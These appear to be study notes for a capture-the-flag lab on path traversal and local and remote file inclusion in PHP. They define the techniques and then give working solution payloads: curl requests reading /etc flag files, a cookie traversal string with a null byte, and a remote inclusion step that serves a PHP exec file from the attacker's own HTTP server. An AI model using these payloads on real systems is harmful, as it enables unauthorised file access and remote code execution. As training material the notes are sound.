- **Essential parts of the url**
- **Path/Directort Transversal** -> vulnerability that allows an attacker to read operating system resources. The attacker manipulates the url to locate and access files or directories stored outside the root directory.
- **PHP information** -> https://www.php.net
- **Path transversal attacks** -> known as dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../
- **Local File Inclusion (LFI)**
- **NULL Byte** -> %00
- **Remote File Inclusion (RFI)** -> technique to include remote files into a vulnerable application. It has one requirement: `allow_url_fopen` must be on.

![](./img/file1.png)
![](./img/file2.png)
![](./img/file3.png)
![](./img/file4.png)
![](./img/file5.png)
![](./img/file6.png)
![](./img/file7.png)
![](./img/file8.png)
![](./img/file9.png)
![](./img/file10.png)
![](./img/file11.png)
![](./img/file12.png)
![](./img/file13.png)
![](./img/file14.png)
![](./img/file15.png)
![](./img/file16.png)
![](./img/file17.png)
![](./img/file18.png)

CHALLENGES
- To get the first flag, we can put this in terminal: `curl -X POST https://MACHINEIP/challenges/chall1.php -d 'method=GET&file=/etc/flag1'`
- To get the second flag, we open burpsuite and put on cookie `../../../../etc/flag2%00`
- To get the third flag, we put this in terminal: `curl -X POST https://MACHINEIP/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00'`
- To get the hostname (Remote File Inclusion), whe set up our remote server writing `sudo python3 -m http.server` and then we create a file txt with the content: `<?php print exec('hostname'); ?>` and we intruduce on the url `http://MACHINEIP/playground.php?file=http://myIP:PORT/file.txt` and the hostname is shown.